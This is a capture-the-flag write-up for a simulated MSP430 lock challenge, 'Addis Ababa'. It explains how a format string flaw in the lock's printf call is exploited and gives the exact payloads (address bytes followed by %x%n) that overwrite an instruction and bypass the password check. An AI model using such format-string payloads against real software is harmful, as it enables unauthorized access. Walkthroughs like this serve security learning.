# Addis Ababa

## Challenge overview

Lockitall LockIT Pro, rev b.03
- We have verified passwords can not be too long.
- Usernames are printed back to the user for verification.
- This lock is attached the the LockIT Pro HSM-1.

## Solution

### Solution overview

This solution utilizes a format string vulnerability to inject a code fault at a critical point in the authentication algorithm.

### Analysis

The device requires an input string in the format &lt;username&gt;:&lt;password&gt;.  The total length of the input string, including null terminator, may not be longer than 20 characters.

On analysis of the disassembled code, the input is written back out using printf(), which supports %s, %x and %n.  It does not support '\\' escapes, '$' parameters, or any other parameters.  The limited parameter options combined with the limited input size makes the format string vulnerability unsuitable for writing arbitrary values.

There are a limited number of things that we can do with this format string vulnerability.  We can provide an address to overwrite within the input string, and %x can be used to consume unwanted parameters so that %n can be aligned with the address parameter.  However, %n can only be used to write small values.  We don't have appropriate parameters or input string length to build output characters up to any arbitrary number for %n to write.  So while we can aim, we are very limited in what we can write.

### Attack

Perhaps we can overwrite a single instruction, as in a clock glitch or voltage glitch attack, and affect the flow of execution.  The following section of code includes a conditional jump just before the call to unlock_door().  If we knock out either the check value at 0x448C or the conditional jump at 0x448E, we can unlock the door despite failing the authentication check.

	447c:  b012 c845      call	#0x45c8 <printf>            ; Execute format string here.
	4480:  2153           incd	sp
	4482:  3f40 0a00      mov	#0xa, r15
	4486:  b012 5045      call	#0x4550 <putchar>
	448a:  8193 0000      tst	0x0(sp)						; Overwrite 0x0000,
	448e:  0324           jz	#0x4496 <main+0x5e>         ; ...or overwrite conditional jump.
	4490:  b012 da44      call	#0x44da <unlock_door>       ; Profit here either way.
	4494:  053c           jmp	#0x44a0 <main+0x68>
	4496:  3012 1f45      push	#0x451f "That entry is not valid."
	449a:  b012 c845      call	#0x45c8 <printf>
	449e:  2153           incd	sp
	44a0:  0f43           clr	r15
	44a2:  3150 1600      add	#0x16, sp
	44a6 <__stop_progExec__>
	44a6:  32d0 f000      bis	#0xf0, sr
	44aa:  fd3f           jmp	#0x44a6 <__stop_progExec__+0x0>

Just ignore for a moment whether or not the MSP430 has any code protection, or whether or not this device is running code from flash.  Let's try it anyway.

The following input strings should implement our attack:

	"\x8C\x44%x%n" or "\x8E\x44%x%n"

Broken down as follows:
* \x8C\x44 is the address of the check value that we want to overwrite (solution 1).
* \x8E\x44 is the address of the conditional jump that we want to overwrite (solution 2).
* %x consumes a parameter, so that %n will align with the address at the beginning of the input string.
* %n writes out the number of characters written so far (0x0002).

The final solutions, provided as hex input: 8C442578256E or 8E442578256E
